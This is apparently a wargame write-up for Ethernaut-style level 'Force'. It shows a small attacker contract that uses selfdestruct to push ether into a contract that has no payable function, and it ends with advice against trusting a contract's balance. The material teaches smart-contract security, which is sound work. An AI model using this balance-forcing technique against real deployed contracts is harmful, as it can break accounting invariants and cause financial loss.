# Level 07: Force

## Goal

Make the balance of the Force contract greater than zero.

## The contract

```solidity
contract Force {
    // empty: no payable function, no receive, no fallback
}
```

## Vulnerability

`Force` has no way to receive ether through normal calls. A naive assumption is that its balance can therefore never change. That assumption is wrong.

`selfdestruct(target)` sends the destroyed contract's entire balance to `target` **unconditionally**, even if the target has no payable function. (Ether can also arrive via block rewards / `coinbase`.)

## Exploit

1. Deploy an attacker contract funded with a little ether:

```solidity
contract ForceSend {
    constructor() payable {}

    function attack(address payable target) external {
        selfdestruct(target); // forces balance to target
    }
}
```

2. Deploy it with some wei, then call `attack(forceAddress)`. The selfdestruct pushes the ether into `Force`, so its balance becomes greater than zero.

## Fix

- Never assume a contract's ether balance can only change through its own functions.
- Do not use `address(this).balance` as a trusted invariant for critical logic; track deposits with an internal accounting variable instead.

## Takeaway

You can force ether into any address using `selfdestruct`. Contracts must never rely on their balance being unchangeable or matching an internal expectation.
